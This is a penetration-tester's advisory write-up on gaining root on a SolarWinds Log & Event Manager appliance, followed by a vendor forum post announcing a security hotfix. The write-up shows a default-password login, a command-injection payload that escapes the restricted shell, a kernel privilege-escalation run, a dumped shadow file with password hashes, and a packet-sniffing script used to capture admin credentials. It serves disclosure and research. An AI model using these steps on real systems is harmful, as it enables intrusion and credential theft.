=== Content from pentest.blog_9e3389cd_20250125_084106.html ===

[Skip to main content](#content)
[![Pentest Blog](https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png)](https://pentest.blog/)

Toggle navigation

* [Advisories](https://pentest.blog/category/advisories/)
* [Operating System](https://pentest.blog/category/operating-system/)
* [Application Security](https://pentest.blog/category/application-security/)
* [Network](https://pentest.blog/category/network/)
* [Tools](https://pentest.blog/category/tools/)
* [Article Series](https://pentest.blog/article-series/)
* [About Us](https://pentest.blog/about-us/)

![](https://pentest.blog/wp-content/uploads/northern-lights-225525_1280-750x410.jpg)
# Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product

 [March 17, 2017March 17, 2017](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/), [Network](https://pentest.blog/category/network/)

By time goes, I’ve found myself more focusing on SIEM product during penetration test. This is the fourth article of my article series called as “Unexpected Journey” which all of them focused on different SIEM products. In this article, I will share the details how I’ve got root access to the SolarWinds Log & Event Management product.

We detected a web interface during the network scanning and then our journey has begun.

### Performing Full Nmap and Deciding Initial Attack Vectors

Like every pentester do, we performed a full network scan on selected IP address. Here is the result.

```
➜  ~ nmap -sS -A -p - --version-all 12.0.0.154 -Pn -n
...
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 5.5p1 Debian 6+squeeze8 (protocol 2.0)
| ssh-hostkey:
|   1024 3b:f7:c5:30:df:88:b4:c7:8d:0a:6c:ac:7f:05:95:a7 (DSA)
|_  2048 0f:33:37:21:c9:7b:b6:78:93:09:a5:fe:23:9b:08:aa (RSA)
25/tcp    filtered smtp
80/tcp    open     http          Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: SolarWinds Log &amp; Event Manager
443/tcp   open     ssl/https     Apache-Coyote/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: SolarWinds Log &amp; Event Manager
| ssl-cert: Subject: commonName=swi-lem/organizationName=SolarWinds/countryName=US
| Issuer: commonName=SWI LEM CA/organizationName=SolarWinds/stateOrProvinceName=Texas/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2017-03-01T12:17:20
| Not valid after:  2027-02-27T12:17:20
| MD5:   bf89 8039 7749 6e49 084f 09de 5f05 d669
|_SHA-1: 7a8e ea43 5a84 2f0c 4fab f878 5888 a9a0 91a1 7d2f
|_ssl-date: 2017-03-02T11:32:53+00:00; -1s from scanner time.
514/tcp   open     shell?
4803/tcp  filtered unknown
5432/tcp  filtered postgresql
8080/tcp  open     http          Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: SolarWinds Log &amp; Event Manager
8443/tcp  open     ssl/https-alt Apache-Coyote/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: SolarWinds Log &amp; Event Manager
| ssl-cert: Subject: commonName=swi-lem/organizationName=SolarWinds/countryName=US
| Issuer: commonName=SWI LEM CA/organizationName=SolarWinds/stateOrProvinceName=Texas/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2017-03-01T12:17:20
| Not valid after:  2027-02-27T12:17:20
| MD5:   bf89 8039 7749 6e49 084f 09de 5f05 d669
|_SHA-1: 7a8e ea43 5a84 2f0c 4fab f878 5888 a9a0 91a1 7d2f
|_ssl-date: 2017-03-02T11:32:53+00:00; 0s from scanner time.
9001/tcp  open     tor-orport?
10009/tcp filtered swdtp-sv
10010/tcp filtered rxapi
10011/tcp filtered unknown
10012/tcp filtered unknown
10101/tcp filtered ezmeeting-2
10102/tcp filtered unknown
32022/tcp open     ssh           OpenSSH 5.5p1 Debian 6+squeeze8 (protocol 2.0)
| ssh-hostkey:
|   1024 3b:f7:c5:30:df:88:b4:c7:8d:0a:6c:ac:7f:05:95:a7 (DSA)
|_  2048 0f:33:37:21:c9:7b:b6:78:93:09:a5:fe:23:9b:08:aa (RSA)
37890/tcp open     ssl/unknown
37891/tcp open     unknown
37892/tcp open     unknown
```

Here is the initial attack vectors we had planned to continue with:

1. There is number of web management interface running on 80, 443, 8080, 8443.

   Pentester Comment: Most of the product are using 80 and 443 to redirect user to 8080 and 8443. We could look for`/manager/` path for known attacks such as war deploy etc.
2. There is a 3 non-common open port (37892, 37890, 37891)

   Pentester Comment: I believe those ports are used for communication between agents and server. We could go deeper and look for some sort of API abusement, overflows or format strings.
3. SSH services are detected on 22 and 32022.

   Pentester Comment: That is quite interesting. Why did they decide to bind 32022 along side with 22 ?

After initial attack vector decision, I’ve ask to one of my teammate for take care of `Option #1` and I choose `Option #3` for myself. Obviously, `option #2` requires much much more effort which is the reason we left it for last option.

### Uncovering SSH User (Thanks to Docs)

First thing I’ve done was performing a brute-force with wordlist. I was not expecting to log in directly to the server with weak password but you know, we need to do basic check all the time. I’ve started to thinking about the same question. Why did they decided to bind 32022 port ? In order to find out a requirement, I’ve started to googling and found following crucial information.

[![](https://pentest.blog/wp-content/uploads/solarwind-default-password-1024x531.png)](https://pentest.blog/wp-content/uploads/solarwind-default-password-e1488455474826.png)

Default password of Solarwinds LEM

Following output shows initial connection to the SSH service.

```
➜ ssh [[email protected]](/cdn-cgi/l/email-protection) -p 32022
Password:
Linux swi-lem 3.2.0-3-amd64 #1 SMP Mon Jul 23 02:45:17 UTC 2012 x86_64
Last login: Thu Mar  2 02:29:55 2017 from 12.0.0.1
  //////////////////////////////////////////////////
  ///       SolarWinds Log & Event Manager       ///
  ///                   management console       ///
  //////////////////////////////////////////////////

Detected VMware Virtual Platform
Product Support Key: 83B3R-58Y75-KTUY-KPWM-KQLS7-J7QKQ
Available commands:
  [ appliance ]  Network, System
  [ manager ]    Upgrade, Debug
  [ service ]    Restrictions, SSH, Snort
  [ ndepth ]     nDepth Configuration/Maintenance
    upgrade      Upgrade this Appliance
    admin        Run Admin UI (for better usability browse https://12.0.0.154/mvc/configuration)
    import       Import a file that can be used from the Admin UI
    help         display this help
    exit         Exit
cmc >
```

That was quite surprising for me. How the hell did they left default password ? In order to understand installation process of SolarWind LEM and find out password change policies, I’ve downloaded the latest version from vendor page and completed the installation. If you are visiting **web management** interface in first time, LEM forces you to change default password. There is no other way to continue using product without changing the password. But **SSH** user cmc’s password remains same all the time. You have to particularly connect to the SSH and change the password manually by using restricted shell!

### Escaping From Restricted Shell

As you can see at SSH output, we had restricted shell. I’ve tried very simple known commands to escape from jail but none of them had worked. Then I’ve stared to looking for a features of given menus and started to think about how can I abuse them.

```
cmc > service
Available commands:
    startssh           Start the SSH Service
    stopssh            Stop the SSH Service
    restartssh         Restart the SSH Service
    restrictssh        Restrict Access to the SSH Service (by IP Address/hostname)
    unrestrictssh      Remove Restrictions on Access to the SSH Service
    snmp               Configure the SNMP Services
    copysnortrules     Copy Snort rules to floppy or network share
    loadsnortrules     Load Snort rules from floppy or network share
    loadsnortbackup    Load Snort rules from backup
    restartsnort       Restart the Snort Service
    enableflow         * Enable the flow Collection Service
    disableflow        Disable the flow Collection Service
    restrictconsole    Restrict Access to the Manager Console (GUI) by IP/hostname
    unrestrictconsole  Remove Restrictions on Access to the Console (GUI)
    restrictreports    Restrict Access to Reports by IP/hostname
    unrestrictreports  Remove Restrictions on Access to Reports
    stopopsec          Stop all running OPSEC LEA client connections
    help               display this help
    exit               Return to main menu

    NOTE: Commands with an asterisk (*) include an automatic manager service restart
```

One menu called as **restrictssh**looked promising to me. Because, it must be performing a operating system commands in order to update `/etc/ssh/sshd_config` file.

If I were a man who implemented this feature, I probably use `AllowUsers cmc@[USER_SUPPLIED_IP_ADDRESS]` command at config file. Which is really good location where we can inject `/bin/bash` or familiar things that may help us to escape from restricted shell. I’ve decided to go with this feature.

```
cmc::service > restrictssh
Press <enter> to configure restriction on the SSH service to the Manager Appliance

Please enter the IP addresses or hostnames you wish to allow, space separated
  (e.g. machine1 machine2.domain.com machine3)
> *#`bash>&2`
Are the hosts *#`bash>&2` correct? <Y/n>
Done restricting the SSH service.
cmc@swi-lem:/usr/local/contego$ id
uid=1001(cmc) gid=1000(trigeo) groups=1000(trigeo),4(adm),24(cdrom),25(floppy),104(postgres),105(snort),1002(dbadmin)
cmc@swi-lem:/usr/local/contego$
```

Sweet..! You may ask why did I use `*#`bash>&2`` this payload. If my assumption is true, I don’t want to mess up with config file. If I cause a some sort of syntax error on config file, I may not be able to connect SSH anymore.

It’s turned out my assumption was totally true. Here is the config file of ssh. *(I’m so happy that I’m not a developer btw! But thinking like them always saved my life so far!)*

```
mc@swi-lem:/usr/local/contego$ cat /etc/ssh/sshd_config|grep AllowUsers

AllowUsers trigeo@* [[email protected]](/cdn-cgi/l/email-protection) cmc@*#`bash>&2`*
```

I’ve managed to inject our payload to the script as a input. But it also used by script for updating SSH config file. Our payload begins with **\*** because I want to cmc user accessible from everywhere. **#**used right after \* in order to comment out rest of the payload in order to block syntax error on ssh file ?

### Escalating To The Root

From my experience, all these type of products shipped with a old kernels. We’ve seen this on previous articles of Unexpected Journey articles.

```
cmc@swi-lem:/usr/local/contego$ uname -a
Linux swi-lem 3.2.0-3-amd64 #1 SMP Mon Jul 23 02:45:17 UTC 2012 x86_64 GNU/Linux

cmc@swi-lem:/usr/local/contego$ cat /etc/issue
Debian GNU/Linux 6.0 \n \l
```

We can directly use `dirtyc0w` and `ntfs-3g` vulnerabilities that causes a local privileges escalation. In order to create a reliable exploit we need gcc and linux header packages must be installed on target. Otherwise, we need to compile them locally and then upload them which may cause also make our exploit unreliable due to missing linking and header files.

I’ve managed to compile [Linux Kernel < 3.8.9 (x86-64) – ‘perf\_swevent\_init’ Privilege Escalation (2)](https://www.exploit-db.com/exploits/26131/) and uploaded to the server.

```
cmc@swi-lem:/tmp$ chmod +x perf_swevent
cmc@swi-lem:/tmp$ ./perf_swevent
Searchin...
perf_swevent_enabled is at 0xffffffff817d9b40
IDT at 0xffffffff8172b000
Using interrupt 0
Shellcode at 0x81000000
Triggering sploit
id
Got signal
Launching shell

# id
uid=0(root) gid=1000(trigeo) groups=0(root),4(adm),24(cdrom),25(floppy),104(postgres),105(snort),1000(trigeo),1002(dbadmin)

# cat /etc/shadow
root:$6$N1ACi2G5$piyQgQ9qGQt5QE6borGr.hlj9aGzHjSbLwL4GrvRmnVxnjIbLHdZA5dRg5PmQ1gl7xmJELvgd03waWtAvE1BC1:17229:0:99999:7:::
daemon:*:12966:0:99999:7:::
bin:*:12966:0:99999:7:::
sys:*:12966:0:99999:7:::
sync:*:12966:0:99999:7:::
games:*:12966:0:99999:7:::
man:*:12966:0:99999:7:::
lp:*:12966:0:99999:7:::
mail:*:12966:0:99999:7:::
news:*:12966:0:99999:7:::
uucp:*:12966:0:99999:7:::
proxy:*:12966:0:99999:7:::
www-data:*:12966:0:99999:7:::
backup:*:12966:0:99999:7:::
list:*:12966:0:99999:7:::
irc:*:12966:0:99999:7:::
gnats:*:12966:0:99999:7:::
nobody:*:12966:0:99999:7:::
Debian-exim:!:12966:0:99999:7:::
trigeo:$6$kCwwUXLYd5/YIu$cZFvgC4.xKUgbGLZ5TtL7RlovL2qehNEV8L9fZ5Pv0PxaF5U1B20Pf5wz1XD10qOLE.K0/vWZIpz1ct2JNEzw/:17226:0:99999:7:::
sshd:!:12966:0:99999:7:::
postgres:!:12966:0:99999:7:::
cmc:$6$dEqXJUot$vrCf4szo9yugTPx25FNflWzSHCRulPqLLODZu57lqwJj9JXmOKloTiLe6Es9KuYrjteqYtFH5rgFIwe2ZK4gn0:17226:0:99999:7:::
libuuid:!:14785:0:99999:7:::
snort:*:14785:0:99999:7:::
messagebus:*:15849:0:99999:7:::
snmp:*:16310:0:99999:7:::
lynx:x:17032:0:99999:7:::

```
### Metasploit Module

Here is the metasploit module on action for this vulnerability (<https://github.com/rapid7/metasploit-framework/pull/8126>)

### Post Exploitation: Invalidating All Session and Capturing Network Packets for Plain-Text Password

One thing that I wanted to do right after gaining a root privilege session was capture the administrator credentials. Instead of brute-forcing a password hash taken from database, I decided to capture network packets on target but tcpdump and other network diagnostic tools wasn’t installed on the target. I’ve used following python script in order to capture all network traffics.

```
#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket
import struct
import time

class Pcap:
    def __init__(self, filename, link_type=1):
        self.pcap_file = open(filename, 'wb')
        self.pcap_file.write(struct.pack('@ I H H i I I I', 0xa1b2c3d4, 2, 4, 0, 0, 65535, link_type))

    def write(self, data):
        ts_sec, ts_usec = map(int, str(time.time()).split('.'))
        length = len(data)
        self.pcap_file.write(struct.pack('@ I I I I', ts_sec, ts_usec, length, length))
        self.pcap_file.write(data)

    def close(self):
        self.pcap_file.close()

pcap = Pcap('capture.pcap')

conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))

while True:
    raw_data, addr = conn.recvfrom(65535)
    pcap.write(raw_data)
```

This script listens network interface and then save packages in a pcap format into the file called as capture.pcap. Now it’s time to invalidate all existing session so sys admins go over login action one more time for us.

```
# /etc/init.d/lem-manager restart
Stopping SolarWinds LEM Manager... [done]
Starting SolarWinds LEM Manager... [done]
```

I’ve restarted the service and then started the packet capturing script immediately. After waiting about 20 mins, I’ve downloaded pcap file to my local machine and started to analysis.

SolarWind LEM product uses Java AMF serialization for API call. I didn’t want to spend to much time to write another python script for parsing pcap and performing AMF deserialization. I knew wireshark had a support for almost every single protocol.

[![](https://pentest.blog/wp-content/uploads/solarwind-amf-1024x375.png)](https://pentest.blog/wp-content/uploads/solarwind-amf-e1488663448997.png)

I’ve filtered http packets and found POST requests that possibly contains a login action. And then kept continuing to using wireshark for AMF deserialization. As you can see above screenshot, we have a base64 encoded string that represents auth.

```
➜  ~ echo "YWRtaW46TWVobWV0MTIz"| base64 -D

admin:Mehmet123
```

Sweet..!  I’ve got what I needed.

#### What we could do if the sys admins were using 8443 instead of 8080 ?

Since we have got a root shell on target, we can easily capture the SSL private-public key pairs. Following screenshot shows Java truststore password that has used by the init script as a parameter. You can directly go exactly same approach with one extra step?

[![](https://pentest.blog/wp-content/uploads/solarwind-ssl-passphares-1024x340.png)](https://pentest.blog/wp-content/uploads/solarwind-ssl-passphares-e1488663815576.png)

PS: Do not forget to disable diffie-hellman ciphers before restarting the service. Otherwise, you will not be able to decrypt SSL traffic even if you have a private key. Server and client selects prime numbers that will used for shared secret key generation which is only known by server and client during session.

[0day](https://pentest.blog/tag/0day/) [advisory](https://pentest.blog/tag/advisory/)

![](https://secure.gravatar.com/avatar/a02c8481b3d29584e05195893e584b61?s=60&d=monsterid&r=g)

#### [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)

Master Ninja @ Prodaft / INVICTUS Europe.

## Post navigation

 [Unexpected Journey #3 – Visiting Another SIEM and Uncovering Pre-auth Privileged Remote Code Execution](https://pentest.blog/unexpected-journey-3-visiting-another-siem-and-uncovering-pre-auth-privileged-remote-code-execution/)[Advisory | Cryptolog Unauthenticated Remote Code Execution](https://pentest.blog/advisory-cryptolog-unauthenticated-remote-code-execution/)

Search for:

### PRODAFT Cyber Intelligence and Cyber Security Services

[![](https://pentest.blog/wp-content/uploads/Mg6EYwIk_400x400.jpg)](https://www.invictuseurope.com/)

### Recent Posts

* [Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/)
* [Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137](https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/)
* [Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/)
* [LiderAhenk 0day – All your PARDUS Clients Belongs To Me (CVE-2021-3825)](https://pentest.blog/liderahenk-0day-all-your-pardus-clients-belongs-to-me/)
* [Pardus 21 Linux Distro – Remote Code Execution 0day 2021 CVE-2021-3806](https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/)
### Latest Comments

* [Ege Balci](https://github.com/EgeBalci) on [Art of Anti Detection 3 – Shellcode Alchemy](https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244)
* Chase Run Taylor on [Art of Anti Detection 1 – Introduction to AV & Detection Techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243)
* [Mehmet İnce](http://www.mehmetince.net/) on [Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242)
* 0x00 on [Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241)
* [Mehmet İnce](http://www.mehmetince.net/) on [Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240)
### Tags

[0day](https://pentest.blog/tag/0day/)
[1day](https://pentest.blog/tag/1day/)
[advisory](https://pentest.blog/tag/advisory/)
[alienvault](https://pentest.blog/tag/alienvault/)
[android](https://pentest.blog/tag/android/)
[application](https://pentest.blog/tag/application/)
[assembly](https://pentest.blog/tag/assembly/)
[bof](https://pentest.blog/tag/bof/)
[burp](https://pentest.blog/tag/burp/)
[bypass](https://pentest.blog/tag/bypass/)
[crypter](https://pentest.blog/tag/crypter/)
[decoder](https://pentest.blog/tag/decoder/)
[dns](https://pentest.blog/tag/dns/)
[EMET](https://pentest.blog/tag/emet/)
[encoder](https://pentest.blog/tag/encoder/)
[exploit](https://pentest.blog/tag/exploit/)
[hook](https://pentest.blog/tag/hook/)
[iat](https://pentest.blog/tag/iat/)
[icmp](https://pentest.blog/tag/icmp/)
[in-memory](https://pentest.blog/tag/in-memory/)
[IOT](https://pentest.blog/tag/iot/)
[linux](https://pentest.blog/tag/linux/)
[malware](https://pentest.blog/tag/malware/)
[metasploit](https://pentest.blog/tag/metasploit/)
[multi-stage](https://pentest.blog/tag/multi-stage/)
[nas](https://pentest.blog/tag/nas/)
[packer](https://pentest.blog/tag/packer/)
[php](https://pentest.blog/tag/php/)
[ransomware](https://pentest.blog/tag/ransomware/)
[rce](https://pentest.blog/tag/rce/)
[reflective](https://pentest.blog/tag/reflective/)
[research](https://pentest.blog/tag/research/)
[reverse](https://pentest.blog/tag/reverse/)
[reversing](https://pentest.blog/tag/reversing/)
[secure coding](https://pentest.blog/tag/secure-coding/)
[securityonion](https://pentest.blog/tag/securityonion/)
[self-defence](https://pentest.blog/tag/self-defence/)
[shellcode](https://pentest.blog/tag/shellcode/)
[siem](https://pentest.blog/tag/siem/)
[sql injection](https://pentest.blog/tag/sql-injection/)
[sqlmap](https://pentest.blog/tag/sqlmap/)
[stager](https://pentest.blog/tag/stager/)
[storage](https://pentest.blog/tag/storage/)
[tunneling](https://pentest.blog/tag/tunneling/)
[windows](https://pentest.blog/tag/windows/)
### Awarded Top 15 Pentest Blog

[![Pentest Blogs](/wp-content/uploads/pentest_1000px.png)](https://blog.feedspot.com/pentest_blogs/ "Pentest Blogs")

INVICTUS Cyber Security & Intelligence Services | Theme by [Colorlib](http://colorlib.com/) Powered by [WordPress](http://wordpress.org/)



=== Content from thwack.solarwinds.com_788a6336_20250125_084108.html ===


[![THWACK logo](/cfs-filesystemfile/__key/communityserver-components-sitefiles/logos/thwack_2D00_logo_2D00_dark.svg)](https://thwack.solarwinds.com/ "Home")

THWACK

* Search

* [Sign In](/login?ReturnUrl=%2Fproducts%2Fsecurity-event-manager-sem%2Ff%2Fforum%2F33491%2Flem-v6-3-1-hot-fix-4-is-now-available "Join or sign in")

* Search

* Community
  Community

  Find all you need to begin your THWACK journey, including documentation, missions, blogs, community groups, events, and media.

  Command Central
  + [Getting Started](/resources/command-central)

  MVP Program
  + [MVP Program](/resources/command-central/w/thwack-documentation/76/solarwinds-thwack-mvp)

  Monthly Mission
  + [The Race to Resolve](https://thwack.solarwinds.com/resources/b/community-announcements/posts/thwack-monthly-mission---jan-2025)

  Blogs
  + [Community Announcements](/resources/b/community-announcements)
  + [Product Blog](/resources/b/product-blog)

  Groups
  + [DevOps Discourse](/groups/devops)
  + [Data Driven](/groups/data-driven)
  + [See All Groups](/groups)

  Events
  + [SolarWinds User Group](/resources/solarwinds-user-groups-swug)
  + [THWACKcamp](/events-missions-musings/events/thwackcamp)
    - [↪ 2024: On Demand](/events-missions-musings/events/thwackcamp/2024)
  + [Bracket Battle](/events-missions-musings/bracket-battle-2024)

  Media Vault
  + [Movies & Mainframes](/media/b/movies-and-mainframes)
  + [TechPod](/media/b/techpod)
  + [THWACK Tech Tips](/media/tags/THWACK%2BTech%2BTips)
  + [THWACK Livecast](/media/tags/Livecast)
  + [SolarWinds Lab Archive](/media/tags/SolarWinds%2BLab)
  + [THWACKcamp Archive](/media/tags/THWACKcamp)
  + [See All Media](/media)
* Products
  Products

  Find the best place to learn and ask questions about your SolarWinds products.

  Observability
  + [Observability Solutions](/products/observability)
  + [SolarWinds Observability SaaS](/products/solarwinds-observability-saas)
  + [SolarWinds Observability Self-Hosted](/products/solarwinds-observability-self-hosted)
  + [SolarWinds Platform](/products/the-solarwinds-platform)

  Network Management
  + [Network Performance Monitoring](/products/network-performance-monitor-npm)
  + [NetFlow Traffic Analyzer](/products/netflow-traffic-analyzer-nta)
  + [Network Configuration Manager](/products/network-configuration-manager-ncm)
  + [IP Address Manager](/products/ip-address-manager-ipam)
  + [User Device Tracker](/products/user-device-tracker-udt)
  + [VoIP & Network Quality Manager](/products/voip-network-quality-manager-vnqm)
  + [Log Analyzer](/products/log-analyzer)
  + [Engineer's Toolset](/products/engineers-toolset)
  + [Network Topology Mapper](/products/network-topology-mapper-ntm)
  + [Kiwi CatTools](/products/kiwi-cattools)
  + [Kiwi Syslog Server](/products/kiwi-syslog)
  + [ipMonitor](/products/ipmonitor)

  Application Management
  + [AppOptics](/products/appoptics)
  + [Loggly](/products/loggly)
  + [Papertrail](/products/papertrail)
  + [Pingdom](/products/pingdom)
  + [DevOps](/groups/devops)

  IT Security
  + [Access Rights Manager](/products/access-rights-manager-arm)
  + [Identity Monitor](/products/identity-monitor)
  + [Security Event Manager](/products/security-event-manager-sem)
  + [Patch Manager](/products/patch-manager)
  + [Serv-U FTP & MFT](/products/serv-u-ftp-mft)

  IT Service Management
  + [SolarWinds Service Desk](/products/solarwinds-service-desk-swsd)
  + [Web Help Desk](/products/web-help-desk-whd)
  + [DameWare Remote Support](/products/dameware-remote-support-drs)
  + [DameWare Remote Everywhere](/products/dameware-remote-everywhere-dre)
  + [DameWare Mini Remote Control](/products/dameware-mini-remote-control-mrc)

  System Management
  + [Server & Application Monitor](/products/server-application-monitor-sam)
  + [Virtualization Manager](/products/virtualization-manager-vman)
  + [Storage Resource Monitor](/products/storage-resource-monitor-srm)
  + [Server Configuration Monitor](/products/server-configuration-monitor-scm)
  + [SolarWinds Backup](/products/solarwinds-backup)
  + [Web Performance Monitor](/products/web-performance-monitor-wpm)

  Database Management
  + [Database Performance Analyzer](/products/database-performance-analyzer-dpa)
  + [SQL Sentry](/products/sql-sentry)
  + [Database Performance Monitor](/products/database-performance-monitor-dpm)
  + [Database Mapper](/products/database-mapper)
  + [Task Factory](/products/task-factory)
* Content Exchange
  Content Exchange

  Find downloadable files and templates other users have built and found useful to share with others.

  SolarWinds Platform
  + [Alerts](/content-exchange/the-orion-platform/m/alerts)
  + [Custom HTML](/content-exchange/the-orion-platform/m/custom-html)
  + [Custom Queries](/content-exchange/the-orion-platform/m/custom-queries)
  + [Modern Dashboards](/content-exchange/the-orion-platform/m/modern-dashboards)
  + [Reports](/content-exchange/the-orion-platform/m/reports)
  + [Scripts](/content-exchange/the-orion-platform/m/scripts)

  Server & Application Monitor
  + [API Pollers](/content-exchange/server-application-monitor/m/api-pollers)
  + [Application Monitor Templates](/content-exchange/server-application-monitor/m/application-monitor-templates)

  Database Performance Analyzer
  + [Custom Alerts](/content-exchange/database-performance-analyzer/m/custom-alerts)
  + [Custom Metrics](/content-exchange/database-performance-analyzer/m/custom-metrics)
  + [Custom Queries](/content-exchange/database-performance-analyzer/m/custom-queries)

  Server Configuration Monitor
  + [Policies](/content-exchange/server-configuration-monitor/m/policies)
  + [Profiles](/content-exchange/server-configuration-monitor/m/profiles)

  Network Performance Monitor
  + [Device Pollers](/content-exchange/network-performance-monitor/m/device-pollers)
  + [Universal Device Pollers](/content-exchange/network-performance-monitor/m/universal-device-pollers)

  Network Configuration Manager
  + [Config Change Scripts](/content-exchange/network-configuration-manager/m/config-change-scripts)
  + [Device Templates](/content-exchange/network-configuration-manager/m/device-templates)
  + [Firmware Upgrade Templates](/content-exchange/network-configuration-manager/m/firmware-upgrade-templates)
  + [Policy Documents](/content-exchange/network-configuration-manager/m/policy-documents)

  SQL Sentry
  + [Advisory Conditions](/content-exchange/sql-sentry/m/advisory-conditions)

  Web Help Desk
  + [Style Sheets](/content-exchange/web-help-desk/m/style-sheets)
* Resources
  [![SolarWinds Customer Portal](/cfs-filesystemfile/__key/communityserver-components-sitefiles/logos/swcp.png)

  Customer Portal](https://customerportal.solarwinds.com)

  Create individual user accounts for your team, manage your licenses, download your SolarWinds software, create and track support tickets, and more.

  [![SolarWinds Academy](/cfs-filesystemfile/__key/communityserver-components-sitefiles/logos/swa.png)

  Academy](https://thwack.solarwinds.com/support/academy)

  A one-stop-shop for world-class training for SolarWinds products through on-demand videos, and instructor-led classes. All SolarWinds Academy content is included with every software purchase.

  [![SolarWinds Customer Success](/cfs-filesystemfile/__key/communityserver-components-sitefiles/logos/swcs.png)

  Support](https://support.solarwinds.com)

  Get help when you need it from a world-class support team, available to assist with technical product issues 24 hours a day, seven days a week, 365 days a year.

  [![SolarWinds Partner Portal](/cfs-filesystemfile/__key/communityserver-components-sitefiles/logos/swpp.png)

  Partner Portal](https://www.solarwinds.com/partners)

  Accelerate SolarWinds Partners’ ability to drive digital and IT transformation for customers with powerful tools, resources, and increased profit potential.
* [Free Tools & Trials](/free-tools-trials)
* [Store](/p/store)

[![Security Event Manager (SEM)](https://thwack.solarwinds.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-groupavatars-00-00-00-00-36/SEMsecurity_5F00_GroupImage_5F00_150x150.png.png_2D00_68x68x2.png?_=637564468221639069)](https://thwack.solarwinds.com/products/security-event-manager-sem/)

* [Products](https://thwack.solarwinds.com/products/)

[Security Event Manager (SEM)](https://thwack.solarwinds.com/products/security-event-manager-sem/)

[Forum](https://thwack.solarwinds.com/products/security-event-manager-sem/f/forum)

[LEM v6.3.1 HOT FIX 4 IS NOW AVAILABLE](https://thwack.solarwinds.com/products/security-event-manager-sem/f/forum/33491/lem-v6-3-1-hot-fix-4-is-now-available)

* [Newsroom](/products/security-event-manager-sem/b/news)
* [Forum](/products/security-event-manager-sem/f/forum)
* [What We're Working On](https://thwack.com/wwwo/sem)
* [Feature Requests](/products/security-event-manager-sem/i/feature-requests)
* More
* Cancel

* [New](/login?ReturnUrl=%2Fproducts%2Fsecurity-event-manager-sem%2Ff%2Fforum%2F33491%2Flem-v6-3-1-hot-fix-4-is-now-available)

* State
  Not Answered
* Locked
  Locked
* Replies
  3 replies
* Subscribers
  22 subscribers
* Views
  17958 views
* Users
  0 members are here

Options

* Share
* More
* Cancel

Related

**This discussion has been locked. The information referenced herein may be inaccurate due to age, software updates, or external references.**
You can no longer post new replies to this discussion. If you have a similar question you can start a new discussion in this forum.

# LEM v6.3.1 HOT FIX 4 IS NOW AVAILABLE

[![jhynds](https://thwack.solarwinds.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars-00-00-02-30-09/4UD0M34SO0CC.png_2D00_32x32x2.png?_=637496304615828699)](/members/jhynds)

[jhynds](/members/jhynds)

[over 7 years ago](https://thwack.solarwinds.com/products/security-event-manager-sem/f/forum/33491/lem-v6-3-1-hot-fix-4-is-now-available)

**Download Available:**

<http://downloads.solarwinds.com/solarwinds/Release/HotFix/SolarWinds-LEM-v6.3.1-Hotfix4.zip>

**Hotfix 4 addresses the following issues:**

* Multiple vulnerability issues
* Agent-Manager connection timeouts
* Incorrect free disk space values when raw logging is enabled
* Some log connectors running slowly

**To Install Hotfix 4 on the LEM Appliance:**

**1. Using the LEM Console or an SSH client (such as PuTTY), log in to CMC.**

a.  At the cmc> prompt, enter: manager

b.  At the cmc::manager# prompt, enter: hotfix

**2. Follow the instructions on your screen, providing the network path to your Hotfix 4 files and the appropriate credentials with Read access to this path.**

1. 1. a. For example: \\server\share\unzipped\_hotfix\_folder\hotfix
   2. b. If you receive a message stating that no upgrades were found, ensure that you entered the correct path to the files. When completed, a cmc: prompt appears.

**3. Reboot the appliance.**

a.  Exit the cmc::manager# prompt or at the cmc# prompt, enter: appliance

b.  At the prompt, enter: reboot

**To install Hotfix 4 on the LEM Agents**, **u****se one of the following methods:**

